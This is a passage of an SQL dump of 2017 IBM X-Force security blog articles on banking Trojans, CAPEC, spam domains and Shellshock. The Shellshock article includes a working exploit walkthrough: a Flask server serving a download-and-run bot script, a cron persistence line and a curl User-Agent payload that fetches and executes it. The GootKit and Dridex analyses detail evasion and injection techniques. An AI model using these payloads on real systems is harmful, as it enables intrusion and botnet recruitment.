suspicion among other forum members. This was likely a simple case of inexperience, but it cost him the trust of potential buyers. For his next wrong move, Gosya started selling on additional forums under multiple monikers. When fraudsters realized that the same person was trying to vend under different names, they got even more suspicious that he was a ripper, misrepresenting or selling a product he does not possess. The issue got worse when Gosya changed the malware’s name to Micro Banking Trojan in one last attempt to buy it a new life. That was the point when Gosya was banned in the forums where he was attempting to sell his bot. \n The notable part of this case is that NukeBot is an actual  . It is a functional, modular Trojan that comes with a web-based admin panel to control infected endpoints. The malware is capable of webinjections and does not fall short of other, similar code by much. \n   \n When NukeBot had a test server up, it was captured and analyzed by Arbor Networks, which   in December 2016. Based on this analysis, the malware was a functional and viable code from the get go. IBM X-Force researchers also analyzed NukeBot, specifically because Gosya claimed it was able to circumvent IBM Security’s antifraud protection product,  . These claims were dispelled by X-Force, which determined that NukeBot did not affect Rapport at any point in its development. X-Force researchers also concluded that NukeBot was not a fake product and that its developer was not being taken seriously due to the way he introduced the malware, not because it was a hoax. Banned from the underground venues where he planned to sell NukeBot and distrusted by members of the cybercrime community, NukeBot’s developer was likely struggling to come to terms with months of hard work amounting to nothing. In mid-March 2017, X-Force researchers noticed that NukeBot’s code was leaked in a web-based source code management platform and made available for anyone to pick it up. This move appears to have been the action of the developer, not an intentional leak by another party. What could this mean? An educated guess would be that Gosya was disappointed with the distrust he faced in the underground and decided to release the main module of the malware for others to test and attest to. In Gosya’s arguments with the FlokiBot developer, the latter boasted the number of Google results that appear when one searches the FlockiBot value. Gosya may think the malware will get picked up by more experienced operators and start appearing in attacks in the wild — and in additional security blogs. With yet another   out in the open, the most likely scenario is that NukeBot code will be recompiled and used by botnet operators. Parts of it may be embedded into other malware codes, and we are likely to see actual NukeBot fraud attacks in the wild in the coming months. It’s also possible that Gosya will be readmitted to the same forums from which he was banned, this time as an authorized vendor. He may even deliver on previous promises to supply new modules for the malware. We know from previous incidents, such as the Zeus, Gozi and Carberp leaks, that publicly available source code makes for more malware. This is often incorporated into existing projects. X-Force researchers noted that NukeBot is likely to see the same process take place in the wild, especially since its code is not copied from other leaked malware, per the developer’s claims. At this time, NukeBot has not been detected in real-world attacks and does not have defined target lists. This situation is likely to change in the near future. To help stop threats such as NukeBot before they ever cause damage, banks and service providers can use adaptive solutions to detect infections and protect customer endpoints. Fighting evolving malware threats can be made easier with the right  . With protection layers designed to address the ever-changing threat landscape, financial organizations can benefit from malware intelligence that provides real-time insight into fraudster techniques and capabilities. Consumers wishing to protect themselves from malware infections on endpoints and mobile devices are invited to read our  .', '\'Banking Trojan\', \'Cybercrime\', \'Financial Malware\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'Trojan\', \'underground market\', \'X-Force\'', 'https://securityintelligence.com/the-nukebot-trojan-a-bruised-ego-and-a-surprising-source-code-leak/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (125, 'CAPEC: Making Heads or Tails of Attack Patterns', 'Scott Craig', '2017-3-27', 'When reading summaries of prevalent cyberattacks, I often find myself puzzled. Sometimes it’s because the name of an attack is too ambiguous to know what it is referring to, forcing the reader to make assumptions about the meaning. Many security analysts report attack types using the consequence of the incident, the attack pattern, the name of the device being targeted or a name that was derived at the time and may be used again in the future. Given this inconsistency, a standardization for describing attack type patterns might help analysts report cybersecurity threats more accurately and consistently. Thankfully, an existing standard that has recently been revised sets forth a common set of names for cyberattack patterns. The   is maintained by the  , a not-for-profit organization that operates research and development centers sponsored by the federal government. CAPEC is a comprehensive dictionary and classification taxonomy of known attacks that can be used by analysts, developers, testers and educators to advance community understanding and enhance defenses. The objective of the CAPEC effort is to create a publicly available catalog of common attack patterns classified in an intuitive manner, along with a comprehensive schema for describing related attacks and sharing information about them. For the 2017  , the X-Force team grouped methods of attack observed in 2016 according to the CAPEC standard. IBM X-Force Threat Research adopted the CAPEC standard for attack categorization because it was developed using methodologies similar to those used in other well-established naming conventions for security terms, such as Common Vulnerabilities and Exposure (CVE). Many IT security professionals are already aware of the CVE dictionary of common names for publicly known cybersecurity vulnerabilities. Prior to CVE, the security tools that existed used their own names for vulnerabilities and it was relatively difficult to determine whether varying tools were referring to the same problem. The  , also maintained by MITRE, was launched in 1999 to bring a consistent approach to naming security vulnerabilities and exposures. This effort was successful — CVE is now the industry standard for vulnerability and exposure names. As of March 20, 2017, the   reported 110,503 vulnerabilities, 83,087 of which were associated with a CVE. When using a vulnerability scanning service or tool where a vulnerability is identified, it helps the user to know the associated CVE identifier. The CVE ID documentation provides a short description about the vulnerability and a list of references that offer more details on how to mitigate the specified vulnerability. Another popular naming standard in the developer and security practitioner communities is the   project, a community-developed list of common software security weaknesses. It serves as a common language, a measuring stick for software security tools, and a baseline standard for weakness identification, mitigation and prevention efforts. As of CWE version 2.10, there are a total of 1,005 CWEs. CAPEC uses graph views, which are basically hierarchical representations of attack patterns. The top of the hierarchy is a set of categories (see Figure 1), under which there are meta-level patterns. These meta-level patterns are parents to standard patterns, which may then be parents to detailed patterns. CAPEC version 2.9 currently provides two views on the CAPEC site: Mechanisms of Attack and Domains of Attack. In the Mechanisms of Attack view, nine categories are shown at the top level, with a total of 503 attack patterns within the entire hierarchy. \n \n Shown in Figure 2 is a partial listing of a few expanded branches of the Mechanism of Attack view hierarchy. Note how the hierarchy follows this format: View -> Category -> Meta -> Standard -> Detailed. \n \n The following shows how one would indicate the hierarchy of the detailed attack pattern “Blind SQL Injection,” for instance: (V) Mechanisms of Attack -> (C) Inject Unexpected Items -> (M) Command Injection -> (S) SQL Injection -> (D) Blind SQL Injection Using CAPEC instead of other naming conventions should help analysts better recognize which attack patterns they most often see and then  . Just knowing there have been a lot of distributed denial-of-service (DDoS) attacks, for example, doesn’t indicate how to best defend against them because this type of incident can occur as a consequence of different attack patterns. Here’s an example of two vulnerabilities that, when exploited, can each result in a denial-of-service (DoS), although they have different attack patterns: The CAPEC attack pattern for CVE-2003-0760 is a UDP Flood: (C) Abuse Existing Functionality – (210) -> (M) Flooding – (125) -> (S) UDP Flood – (486)\n Meanwhile, the CAPEC attack pattern for CVE-2016-9429 is Overflow Buffers: (C) Manipulate Data Structures – (255) -> (M) Buffer Manipulation – (123) -> (S) Overflow Buffers – (100)\n Below are some examples of names analysts commonly use when reporting attack types that are not attack patterns: Many in the security community, including the IBM X-Force team, have lumped some of these examples together in the past under the category of “attack type or pattern.” However, as shown above, these examples are not representative of an attack pattern. Some are consequences, such as DoS, while others describe the type of device that’s being targeted, such as an IoT device. We analyze CAPEC mechanisms of attack and attack patterns using data from  . The following is a breakout of the meta attack pattern (M) and standard attack pattern (S) levels below the “Inject Unexpected Items” category, according to the X-Force analysis of 2016 data. More information regarding this attack pattern will be available in the 2017 IBM X-Force Threat Intelligence Index. \n When looking up IDs on the CAPEC website, you will notice there’s a presentation filter option on the left side. It defaults to “Basic” and has an option labeled “Complete.” What is shown from either view is based on the data available and applies to the given entry. The headings noted below are from CAPEC-17. Basic will show you: Summary, Attack Prerequisites, Solutions and Mitigations, and Related Attack Patterns. Complete will show you everything that Basic has, plus: Typical Severity, Typical Likelihood of Exploit, Methods of Attack, Examples-Instances, Attack Skills or Knowledge Required, Resources Required, Solutions and Mitigations, Attack Motivation-Consequences, Injection Vector, Payload, Activation Zone, Payload Activation Impact, Related Weaknesses, Related Attack Patterns, Purposes, CIA Impact, Technical Context, References and Content History. CAPEC was initially released in 2007 and continues to evolve over the years. The Telecommunication Standardization sector (ITU-T), a division of the International Telecommunication Union (ITU) responsible for coordinating standards for the telecommunications industry, approved recommendation   for the use of CAPEC as a standard in April 2013. CAPEC is also used in  . CAPEC version 2.9 was released in January 2017. The focus of version 2.9 was to restructure the Mechanisms of Attack view based on the feedback received by MITRE Corporation. I expect to see more and more cybersecurity professionals adopting CAPEC for classifying and   in the near future.', '\'IBM X-Force Report\', \'IBM X-Force Research\', \'reporting tools\', \'X-Force\'', 'https://securityintelligence.com/capec-making-heads-or-tails-of-attack-patterns/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (126, 'Churn Under the Surface of Global Cybercrime', 'Limor Kessem', '2017-3-17', 'Global cybercrime actors generally adhere to the same principal as a handyman: If it’s not broken, don’t fix it. But that’s not so easy when   works in one area and attackers want to use it to target a new audience or geography. Moving malware across borders to a new target geographic means more resources for everything, from a relatively easy change to the malware configuration file to the acquisition of new target email lists, new spam delivery mechanisms, an understanding of local banks’ authentication requirements, new local money mules and the development of webinjections to correspond with the transaction flow for each target. After the initial investment and establishment of a connection with local crime factions, the time comes to launch actual infection and attack campaigns. To test the waters, cybercrime gangs deploy small rates of   and check the malware’s operation to ensure success before ramping up to a large deployment. They do that to estimate the potential for success in the new geography, reduce the risk that they will be caught early on and, for astute observers, foreshadow a bigger boom in the malware. The crew operating  , which emerged in August 2016, launched the malware during a testing and development period to turn it into a banking Trojan and work out the bugs before its actual   and other English-speaking countries. It then promptly moved to Germany. In some geographies, such as Brazil, for example,   with their more advanced counterparts in other parts of the world to learn how to improve their own malware. In some cases, fraudsters are taking old tactics such as phishing and elevating them to new heights. A recent study reported that more than half of companies saw an   in 2016 compare to the previous year. Even classic malware such as ransomware is morphing into cyber extortion, as seen in the case of TeamXRat in Brazil. This group of attackers moved from banking malware to ransomware as it   with a remote desktop protocol (RDP) brute-force attack. The big names of malware families that topped the charts in 2016 are familiar. Based on data from IBM X-Force and IBM Trusteer, Zeus, Neverquest, Gozi and Dridex were the most active by attack activity across the world in 2016. Zeus continues to be the malware that keeps on giving. After the source code leaked, it was used as the foundation for new malware variants such as   in 2011 and  ,   and   in 2016. By looking at nearly 300 million protected endpoints across the globe, IBM Trusteer and IBM X-Force monitor the latest threat trends including vulnerabilities, exploits, active attacks, viruses and other malware, spam, phishing and malicious web content. To learn more about trends in global cybercrime, read the latest  .', '\'Advanced Malware\', \'Advanced Threats\', \'Cybercrime\', \'Malware\', \'Ramnit\', \'TrickBot\', \'Zeus Malware\', \'Zeus Panda\', \'Zeus Sphinx\'', 'https://securityintelligence.com/churn-under-the-surface-of-global-cybercrime/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (127, 'Enticing Clicks With Spam', 'Ralf Iffert', '2017-3-13', 'Among the key findings from the  , is the ongoing use of spam as an entry vector for attackers. While targeted attacks make headlines, the prevalence of spam traffic means that a variety of attackers are still finding success in this scattershot method to gain access to protected data. IBM X-Force observed spam volume growing dramatically throughout 2016. The composition of spam fluctuates over time. In 2014, we saw a  . In 2016, our global team tracked an increase in spam with malicious attachments harboring banking Trojans and  . Attackers are not limited to a single set of tools, however. The ongoing expansion of domain name choices has added another instrument to the spammer’s toolbox: enticing recipients to click through to malicious sites, ultimately allowing attackers to infiltrate their networks. More than 35 percent of the URLs found in spam sent in 2016 (Figure 1) used traditional, generic top-level domains (gTLD) .com and .info. Surprisingly, over 20 percent of the URLs used the .ru country code top-level domain (ccTLD), helped mainly by the large number of spam emails containing the .ru ccTLD. Even the lesser known domains are already well-established in spammers’ business model. Of the top 20 TLDs used in spam emails, X-Force observed seven new gTLDs in the top 10 ranks of the overall list: .click, .top, .xyz, .link, .club, .space and .site. These new, generic top-level domains provide two advantages to spammers: When we zoom into the numbers for only the new gTLDs, we get the following picture. Note that older most common gTLDs .com, .info, .net, .org and .biz have been intentionally excluded from this chart. By regarding only the new gTLDs used in spam campaigns in 2016, .click rose as the most used new gTLD, occurring in 5.4 percent of the spam emails observed. It was followed by .top (4.6 percent) and .xyz (3.9 percent). The domains .link, .club and .space accounted for 3.4 percent, 1.8 percent and 1.1 percent, respectively, of the URLs used in email spam in 2016. The top 20 new gTLDs combined for more than 22 percent of TLD usage in spam emails in 2016. The following chart shows the monthly usage of the top 20 new gTLDs, compared to the TLDs .com and .ru, which were the two most commonly used TLD spam emails in 2016. While only every 10th URL used in spam was a .com URL in the first quarter of 2016, the domain became a lot more popular during the rest of the year, accounting for more than 20 percent of spam domains and sometimes rising to over 40 percent of all URLs used within spam emails. As for .ru, this TLD saw an opposite trend. While we detected .ru URLs in up to 60 percent of all spam in March 2016, it accounted for a mere 20 percent of spam for the rest of the year. All the top 20 gTLDs put together reached similar values and were used in 10 to 38 percent of all spam URLs. Overall, we did see quite a bit of variation in the monthly usage of these top 20 new gTLDs in spam emails, where each month in the year featured a different popular gTLD preferred by spammers. The figure below shows the distribution of the top new gTLDs over the year in 2016. The first half of 2016 was dominated by the .click and .link gTLDs. In April, .top took a dramatic jump, accounting for 67 percent of the new gTLD usage that month, and made strong subsequent appearances through the remainder of the year. The .xyz gTLD started slowly but increased steadily throughout the year. Its popularity is presumably based on the low purchase price — .xyz is one of the cheapest gTLD domains available, with an average purchase price of just $0.59. The .space gTLD made a dramatic appearance in July, accounting for 73 percent of the new gTLD usage in that month.  were introduced in 2016. This is down from the 117 new gTLDs created in 2016 and the 302 introduced in 2014. Judging by the utilization percentages observed, spammers appeared to be relatively reluctant to make use of new gTLDs in 2016. Of the 36 new gTLDs added in 2016, we only observed one, .stream, that was frequently used in spam campaigns, occurring in nearly 0.01 percent of the spam emails. The other new gTLDs were almost entirely absent. The slow pickup of new gTLDs by spammers can be attributed to the cost of buying a new domain with a specific gTLD. For example, spammy-sounding gTLDs such as .shopping or .insurance are more expensive to register. According to  , a .shopping domain costs $18.28 to register on average. An .insurance domain costs $1,200. On the other hand, a .stream domain registers for an average of $1.48 and can be bought for as little as $0.69, making this gTLD more attractive to spammers who care little about the actual domain name they buy. We have some predictions about the use of specific gTLDs in 2017 and expect the previous gTLD usage trend to continue this year. For 2017, the use of the .xyz gTLD in spam emails appears set to continue on the same track. Over 6 million domains have   using this gTLD, almost half of which provide only private/proxy WhoIs information on their registrants, an indicator of potentially dubious use of the domain. In June of 2016, we saw a dramatic increase in .xyz domain registration due to a price blitz on that particular gTLD that made domains available for  . In fact, some domains were simply given away for free. In June and July, we did not see a corresponding rise in .xyz usage in spam emails, which could be an indicator of those domains being registered by spammers in advance to be used in the following months. In December 2016, the .xyz gTLD achieved  , meaning that the .xyz domain can now be legally used in China. So far, we have not seen any Chinese-language spam using the .xyz domain, but this will definitely be something to look out for in 2017.', '\'IBM X-Force Report\', \'IBM X-Force Research\', \'Phishing\', \'Phishing Attack\', \'Phishing Emails\', \'Spam\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/enticing-clicks-with-spam/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (128, 'Showcasing Threat Intelligence at IBM InterConnect', 'Pamela Cobb', '2017-3-9', 'I am coming up on my third year of planning a topic track for IBM Security at the IBM InterConnect conference, and each year brings even more exciting content. This year, the introduction of   adds yet another dimension to the usefulness and applicability of external threat intelligence. If you aren’t able to attend, fear not! The   lets nonattendees live stream sessions and be part of the experience. If you are attending, check out some of the engaging content from IBM X-Force to help you apply external threat intelligence to your security operations to reduce your time to act on potential threats. If you have implemented threat intelligence feeds in your operations but aren’t quite ready to dive into the sharing part of it, stop by the IBM Security booth Engagement Center to hear Paul Griswold talk about   and how to do it safely. While you’re at the booth, stop by for a live demo of IBM X-Force Exchange. Our X-Force experts will be on hand to show you how to take advantage of new features and enhancements to help  . If you want to ask experts about making the most of a threat intelligence application program interface (API), check out Session 7343 on executing X-Force Exchange API queries, what each returns and how the queries can be combined for different purposes, from vulnerabilities to malware to reputation scoring for IP addresses and URLs. The hashes give local indicators to look for and information about malware. Family information gives more local indicators, or vulnerability IDs lead to product coverage, signatures and affected products. If you’re a seasoned X-Force Exchange user, please stop by one of our client feedback roundtables to give suggestions for improving the platform or the API and to dive deep on  . A number of IBM clients are scheduled to speak about how they have implemented threat intelligence solutions to streamline their operations. From the   (Session 1408) to   (Session 3794), the combination of open standard threat intelligence implementation, security intelligence and incident response has raised the bar for these organizations. In these sessions, clients will share their experience and process for setting up a security operations center (SOC) and incident triage and response plans while leveraging external threat intelligence. Combined with a robust security intelligence solution, one company found that first-level support security analysts were able to  . To  , learn more about the repercussions next-generation attacks bring to SOCs. With more adversaries and attacks, along with the unforeseen consequences of political, technological and economic changes, SOC operators can be at a loss when it comes to taking in the right information to combat advanced attacks. Join   with Etay Maor to learn more about using a cyber range and what IBM has learned from running the X-Force Command Center training facility. Still at a loss on how to sort through the terabytes of threat intelligence that is available? Bring in IBM Watson. In Session 4657, “ ,” experts from IBM X-Force Incident Response and Intelligence Services (X-Force IRIS) will discuss the benefits of applying cognitive security to cyberthreat intelligence to stay current with massive amounts of structured and unstructured data and how to assign context to known threats. You can also catch experts from X-Force IRIS at a   on Wednesday morning for an open forum to ask anything you want about incident response and threat intelligence. I’ve presented a lot of information about the variety of sessions available at InterConnect, so if you’re feeling overwhelmed trying to plan your agenda, fear not! IBM Watson can help you with that, too. To get help finding relevant sessions to take in, visit the   and ask Watson for help.', '\'Cognitive Security\', \'IBM X-Force Exchange\', \'Incident Response (IR)\', \'InterConnect\', \'Security Conferences\', \'Security Operations Center (SOC)\', \'Threat Intelligence\', \'Watson\', \'X-Force\'', 'https://securityintelligence.com/showcasing-threat-intelligence-at-ibm-interconnect/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (129, 'Cheap Shock: Why Shellshock Is Still a Thing', 'Joerg Stephan', '2017-3-6', 'We have all heard of Shellshock. For those who are not aware, Shellshock is a Linux-targeting vulnerability that was   and published as CVE-2014-6271. The exploit was found within the bourne-again shell (BASH), which was the default command shell on almost every Linux and Unix system back then. It enables attackers to execute commands with super-user privileges remotely. Since many applications rely on the BASH, the most common attack method is to send a command sequence to the web server to be interpreted with the BASH. That said, why is Shellshock still in use? The answer is simple: It’s a very cheap attack. Although servers could have been patched for more than two years now, studies have shown that some remain vulnerable.\n Attackers need only a server, basic programming skills and access to malware to carry out this type of attack. The level of knowledge and effort required is quite low. Fraudsters can simply launch attacks against hundreds of different IP addresses per minute and wait to hit a vulnerable server by chance. Furthermore, a Shellshock attack can be carried out for the low price of 4.95 euros, or just a little more than $5, a month.\n Let’s walk through the setup of  . First we need a web server to host our malicious code. We could set up our own Apache or lighthttp server. For this example, however, we will use some basic Python code — namely, Python Flask — just to speed up the setup phase of our attacking server.\n On the main page, we will return a shell script that we would like to have executed on the target server, so we can always adjust our code without the need to change our attack script:\n import flask\n @app.route(“/”)\n def main_site():\n return ”’#/bin/bash\n curl /perlbot > /usr/local/perlbot \nchmod +x /usr/local/perbot \n/usr/local/perlbot”’\n The bash script is simple:\n For the sake of persistence, we could add a line to execute our bot after every reboot. For example:\n echo ” @reboot /usr/local/perlbot” > /etc/cron.d/daily\n Now we need to get the target to execute this BASH script and prepare the statement to  :\n curl -H “User-Agent: () { :; }; curl > myscript.sh ; sh myscrypt.sh”\n Curl will download the BASH script, save it as myscript.sh and execute it afterwards. The final step is to have a downloadable file to add a simple function to our web server:\n @app.route(‘/perlbot’, methods=[‘GET’, ‘POST’]) \ndef download(filename): \nuploads = os.path.join(current_app.root_path, app.config[‘UPLOAD_FOLDER’]) \nreturn send_from_directory(directory=uploads, filename=”perlbot”)\n Finally, we are done.\n With some more scripting effort, you could easily execute the curl statement against a full network range, or even the whole internet, but it will take a while.\n In the end, it is simple math. Statistics show that about 10 percent of all servers are not patched. So let’s say we can attack 1 million servers in six months. That equates to 100,000 bots at a price of 29.70 euros (about $31) — certainly cheap enough to be worth a cybercriminal’s time.', '\'Advanced Threats\', \'Known Vulnerabilities\', \'Shellshock\', \'Vulnerabilities\', \'Vulnerability\', \'Web Server\'', 'https://securityintelligence.com/cheap-shock-why-shellshock-is-still-a-thing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (130, 'GootKit Developers Dress It Up With Web Traffic Proxy', 'Gadi Ostrovsky', '2017-3-1', 'Discovered in summer of 2014,   is widely considered one of the most sophisticated banking Trojans active in the wild. The malware is being used in online banking fraud attacks on consumer and business accounts, mostly in the U.K. and other parts of Europe. In this blog post, I will describe my analysis of a recent GootKit sample (MD5: 60e079ec28d47ef85e93039c21afd19c) discovered by IBM X-Force research in January 2017. The sample caught our attention when we realized that GootKit’s developers had modified its architecture and changed the way it operates on the infected endpoints. My research into GootKit’s inner workings unveiled its new network interception method, which now proxies internet traffic through the malware instead of placing hooks on the browser. GootKit also bypasses certificate validation by hooking other relevant APIs to continue its malicious operation unhindered. The first and most significant change I noticed in recent GootKit samples is an architectural expansion. In the past, GootKit operated on two principal modules: The Main module can be injected into a svchost process, at which point it acts as a master. It can also be injected into a browser process and act as a slave, intercepting all network communications via the browser by hooking the NtDeviceIoControlFile API. The   service is a device-dependent interface that extends the control that applications have over various devices within the system. This API provides a consistent view of the input and output data to the system while still providing the application and the driver a device-dependent method of specifying a communications interface. That two-module setup has changed. Recent samples we collected in 2017 feature three modules instead of two: GootKit now uses this module to redirect internet traffic through its own Main module instead of letting it flow directly from the browser. \n GootKit changes the way it deploys on infected endpoints and the inner workings of its operations. In the sample I analyzed for this post, GootKit is fetched by a dropper. As the droppee, it is run from an already-established persistence mechanism that was set up by its loader. GootKit’s recently updated persistence is achieved through a Group Policy Object (GPO) entry in the Windows Registry. Group Policies control the user’s working environment, and GootKit abuses this feature to launch whenever the computer boots up. Most financial malware families set a RunKey in the Registry, but GootKit has changed that scheme, likely to  . Next, GootKit creates a mstsc.exe process in suspended state and injects the Loader module into it. This process, also known as Remote Desktop Connection (RDC), is the client application for remote desktop services. It allows a user to remotely log into a networked computer running the terminal services server. The mstsc process, in turn, runs a svchost.exe process and injects the Loader module into svchost. Next, the Main module is loaded from the svchost process. The malware’s binaries are stored in the following Windows registry keys: HKCU\\Software\\AppDataLow\\binary  to HKCU\\Software\\AppDataLow\\binary . Upon launching the malware, the Main module begins to set up a proxy server on the infected machines, utilizing GootKit’s new browser injection module. Two functions implemented by GootKit within its node.js engine are being used here: SpInitializeStandaloneMitm and RandomListenPortBase. Using a malicious JavaScript function, SpInitializeStandaloneMitm, the malware creates a proxy for both HTTP and HTTPS traffic on the  . GootKit uses the RandomListenPortBase function to specify the standard port choice for its traffic. HTTP traffic will route via port 80 and HTTPS via port 443. As for the listening port, which is typically randomly selected in the 1024 to 5000 range, GootKit’s hardcoded choice is port 6000. \n Note that the next function called is Initialize Certificate Faker. Upon the creation of a new browser process on the infected endpoint, the Loader module injects the Browser module into that process. The Browser module will, in turn, hook two types of APIs. These hooks enable GootKit to redirect the internet traffic through its own module and switch up the OS flag for an invalid certificate with a valid one, thus disabling any error alerts from the browser. When a new connection is initiated in the browser, GootKit’s hooks change the endpoint’s IP address and the listening port number to those predefined by GootKit earlier on. GootKit uses its hooks on MSAFD_ConnectEx and WSPConnect to check that the traffic type is relevant (TCP/IP). It looks at the header to ensure that sockaddr struct shows the number 16, which is the maximum length for nonhybrid structures in IPv4 addresses: The next verification has to do with the modification of the endpoint’s IP address from an external IP to a local one. GootKit checks that the sa_family is indeed AF_INET, which represents the internet protocol address format. \n GootKit modifies the endpoint’s remote IP address to the local home IP (127.0.0.1) and switches the Transmission Control Protocol (TCP) port to its own selection based on a static value, to which it adds the original TCP port number. The TCP listening port is also changed: \n The value 1770h translates to port number 6000. Since traffic from the user to the bank is routed through the GootKit proxy at this point, GootKit’s developers ensured that Secure Sockets Layer (SSL) error messages don’t pop up and raise the victim’s suspicion. To fake the validity flag, GootKit hooks a couple of APIs. The first is called CertGetCertificateChain. This hook will ensure that every result returned from PCERT_CHAIN_CONTEXT with a pPolicyStatus parameter will change the flag to reflect a valid certificate (set to 0): The second API hooked for this purpose is CertVerifyCertificateChainPolicy. Here, too, GootKit updates the PCERT_CHAIN_POLICY_STATUS error result to 0 for a valid certificate. GootKit’s developers are evidently still working on this malware project, enhancing its evasion techniques and its ability to control what victims see when they browse to their bank’s website. This recent development in GootKit’s operations on infected machines is consistent with the advanced, technical nature of this malware project. Of attacks detected by IBM X-Force in the past year, GootKit was the most active in Europe in 2016, with configurations targeting the U.K., France and Italy. Per X-Force data, GootKit ranks eighth on the global list of the most active   per attack volume. Although it is very sophisticated, it keeps its infection and attack campaigns small and focused, which helps it fly under the radar and avoid detection.', '\'Advanced Malware\', \'Banking Trojan\', \'Financial Malware\', \'GootKit\', \'IBM X-Force Research\', \'Malware\', \'Threat Intelligence\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/gootkit-developers-dress-it-up-with-web-traffic-proxy/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (131, 'Dridex’s Cold War: Enter AtomBombing', 'Magal Baz', '2017-2-28', 'IBM X-Force discovered that Dridex, one of the most nefarious banking Trojans active in the financial cybercrime arena, recently underwent a major version upgrade that is already active in online banking attacks in Europe. A few weeks ago, our cybercrime labs detected a new major version of the Dridex banking Trojan, Dridex v4. The updated code features a new and innovative injection method based on a technique dubbed AtomBombing, which was first disclosed in October 2016 by security firm  . Dridex is the only banking Trojan we have encountered to use AtomBombing. This change is especially significant when it involves Trojans believed to be operated by an organized cybercrime gang because it’s likely to result in other codes adopting the same method in the future. Dridex’s developers also worked on a major upgrade to the malware’s configuration encryption. This upgrade includes implementing a modified naming algorithm, a robust but easy-to-spot persistence mechanism and a few additional enhancements. According to IBM Security detection, Dridex v4 is already out and active in campaigns that mostly target UK banks. Dridex attacks on online banking users in the UK are based on its   and   scheme, which appears to have replaced the webinjects method as Dridex’s top M.O. Dridex’s code is based on that of the Bugat Trojan, which was first discovered in  . Bugat has since evolved into a number of different variations, including Cridex and Feodo. The Dridex form first appeared in 2014. When it comes to their development cycles, Dridex’s authors release minor versions quite often, and a major version much less frequently. The releases of the minor and major versions are easy to spot since Dridex’s developers clearly track their releases. Dridex’s build numbers are found inside its configuration and in the binary’s code. When it comes to major versions for Dridex, the most stable and resilient version to date has been v3, which was released in April 2015 and has been used in all known attack campaigns up until the v4 release. Dridex v2 did not enjoy the same kind of longevity and was only active in early 2015. The first version, released in late 2014, lasted only until the beginning of 2015. The release of a major version upgrade is a big deal for any software, and the same goes for malware. The significance of this upgrade is that Dridex continues to evolve in sophistication, investing in further efforts to evade security and enhance its capabilities to enable financial fraud. \n When it comes to malware detection, the injection of malicious code from one process into another is one of the most popular events antivirus and other security solutions aim to monitor and use as an indication of compromise. Most financial malware uses three steps to inject code: remote memory allocation, remote writing of a payload into the allocated memory and, finally, remote execution of the payload. Malware commonly uses the CreateRemoteThread method to execute a payload or to call LoadLibrary, typically using the following application program interface (API) calls: The problem is that this is a very suspicious and obvious way to inject code. And since it’s likely to raise red flags, malware authors would much rather use alternative methods. In October 2016, enSilo researchers   called AtomBombing, which allows the malware to inject code without making any of the aforementioned API calls. Rather, AtomBombing makes use of Windows’ atom tables and the native API NtQueueApcThread to copy a payload into a read-write (RW) memory space in the target process. It then uses NtSetContextThread to invoke a simple return-oriented programming (ROP) chain that allocates read/write/execute (RWX) memory, copies the payload into it and executes it. Finally, it restores the original context of the hijacked thread. In our analysis of the new Dridex v4 release, we discovered that the malware’s authors have devised their own injection method, using the first step of the AtomBombing technique. They use the atom tables and NtQueueAPCThread to copy a payload and an import table into a RW memory space in the target process. But they only went halfway — they used the AtomBombing technique for the writing of the payload, then used a different method to achieve execution permissions, and for the execution itself. Nonetheless, this is the first implementation of AtomBombing within the context of banking Trojans, probably designed to help Dridex avoid detection. This stage is almost identical to what is described in the EnSilo blog, so we’ll explain it briefly here and focus on what’s unique in Dridex’s implementation of this method. Throughout the injection flow, Dridex needs arbitrary code to be executed by a thread in a targeted process. To do that, it uses Windows asynchronous procedure calls (APC) by calling the NtQueueAPCThread API. There’s a reason here for using the native API instead of opting for kernel32!QueueUserAPC. It allows three parameters to be passed to the APC routine being called instead of just one parameter allowed by kernel32!QueueUserAPC. During the flow of the malicious code injection, Dridex uses APC requests, for which it needs to find a thread in the target process that is in alertable state, meaning a thread that will actually execute APC calls in its queue. To test whether a thread is alertable, Dridex creates an event and uses an APC request to get the thread to run NtSetEvent to it. It uses a loop to do that with several of the target process’s threads, then calls WaitForMultipleObjects to select the first thread to signal its event. Next, Dridex gets the injected process to run memset, again via the NtQueueAPCThread API, to zero-out a RW memory space inside   address space. It then starts writing the import table to the allocated memory to be used later by the payload. The writing is done by first putting the data of the import table into an atom table using a call to GlobalAddAtomW. Next, the malware uses the NtQueueAPCThread API to get the target thread to call GlobalGetAtomW, which retrieves the data and places it in the RW memory space in Ntdll. After handling the import table, the payload is written to another RW address space using the same technique, only this time writing large chunks of payload code at each call to GlobalGetAtomW. At this point, the flow differs from the one described in the  . To get the payload into an executable memory space, Dridex simply calls NtProtectVirtualMemory from the injecting process to change the memory where the payload is already written into RWX. It’s a simple fix and a small compromise for the sake of the overall technique, designed to avoid making suspicious API calls, which are usually monitored by security software. After the preparation, the last stage is the execution of the payload. To avoid calling CreateRemoteThread, Dridex again uses APC. Using an APC call to the payload itself would be very suspicious, however, and could be detected and stopped. Instead, it uses the same GlobalGetAtomW method to patch GlobalGetAtomA, hooking it to execute the payload. This action, of course, requires another call to NtProtectVirtualMemory to make GlobalGetAtomA writable. Dridex then proceeds to use the Windows APC to call GlobalGetAtomA, which executes the payload. Besides building out a new code injection method, Dridex v4 differs from the older versions in several other ways. Below are some of the enhancements made to the code in the new release. Dridex uses its own method to generate MD5 hashes using a string concatenation of the hostname, active user name, OS installation date and an added seed. These hashes are used for many purposes. They can be mutex names, event names, key names for configurations in the registry, RC4 keys and more. In the new version, while the same variables are still being used to generate these hashes, the sequence has changed to shuffle things around and prevent detection by automated checks. Dridex’s configurations contain many details about its targets and the attack types used in each case. Dridex also serves up its redirection scheme from the configuration, which makes it a file it aims to protect. In v4, Dridex’s developers significantly upgraded the   for the configuration. Overall, Dridex continues to use the same multilayered approach it used 